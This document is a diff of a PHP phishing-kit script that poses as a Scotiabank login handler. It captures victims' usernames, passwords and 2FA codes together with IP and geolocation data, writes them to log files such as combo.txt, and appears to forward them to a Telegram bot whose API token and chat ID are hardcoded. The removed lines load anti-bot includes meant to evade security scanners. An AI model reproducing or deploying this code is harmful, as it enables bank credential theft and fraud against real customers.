@@ -1,29 +1,5 @@
 <?php
-include "/anti-bot/Bot-Spox.php";
-include "/anti-bot/Dila_DZ.php";
-include "/anti-bot/Fuck-you.php";
-include "/anti-bot/index.php";
-include "/anti-bot/IP-BlackList.php";
-include "/anti-bot/new.php";
-include "/anti-bot/proxyblock.php";
-include "/anti-bot/whitelist.dat";
-include "/anti-bot/#1.php";
-include "/anti-bot/#2.php";
-include "/anti-bot/#3.php";
-include "/anti-bot/#4.php";
-include "/anti-bot/#5.php";
-include "/anti-bot/#6.php";
-include "/anti-bot/#7.php";
-include "/anti-bot/#8.php";
-include "/anti-bot/#9.php";
-include "/anti-bot/#10.php";
-include "/anti-bot/#11.php";
-include "/anti-bot/#12.php";
-include "/anti-bot/antibot_host.php";
-include "/anti-bot/antibot_ip.php";
-include "/anti-bot/antibot_phishtank.php";
-include "/anti-bot/antibot_proxy.php";
-include "/anti-bot/antibot_userAgent.php";
+
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
@@ -125,11 +101,9 @@ if (strpos($PublicIP, ',') !== false) {
     $PublicIP = explode(",", $PublicIP)[0];
 }
 
-$file       = '/data.dat';
-$file2      = '/data.dat';
-$file3      = '/data.dat';
-$file4      = '/data.dat';
-$file5      = '/data.dat';
+$file       = 'data.dat';
+$file1       = 'combo.txt';
+$file2       = 'master.log';
 $ip         = "" . $PublicIP;
 $uaget      = "" . $user_agent;
 $bsr        = "" . $user_browser;
@@ -167,14 +141,10 @@ if ($success == false) {
     $crn        = $details['currency'];
     $type       = $tp;
     $bank       = "SCOTIA";
-
     $url        = "https://SCOTIA.com";
     $user       = $_POST['username'];
     $pass       = $_POST['password'];
     $code       = $_POST['code'];
-    $code2      = "[2FA][$code]";
-    $logo       = "[S-T-R|CR00K]";
-    $gitusr     = "[SWIF-T-RYNX]";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "" . $full_date;
@@ -189,11 +159,10 @@ if ($success == false) {
 
 
 
-$message = " $bank$lh$ip\n\n-----------------\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
+$message = "[BIBLE TALK][NEW INCOMING MESSAGE]\n\n\n\n\n\n$bank$lh$ip\n\n\[-----------------]\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
+file_put_contents($file, "$message\n\n\n\n[//////////////////////////////////[1-<3-J35U4-EDITION]//////////////////////////////////]\n", FILE_APPEND);
 file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND);
-file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);
-file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
-file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
+file_put_contents($file1, "$user$li$pass\n", FILE_APPEND);
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA";
 $data = [
     'chat_id' => '-821080105',
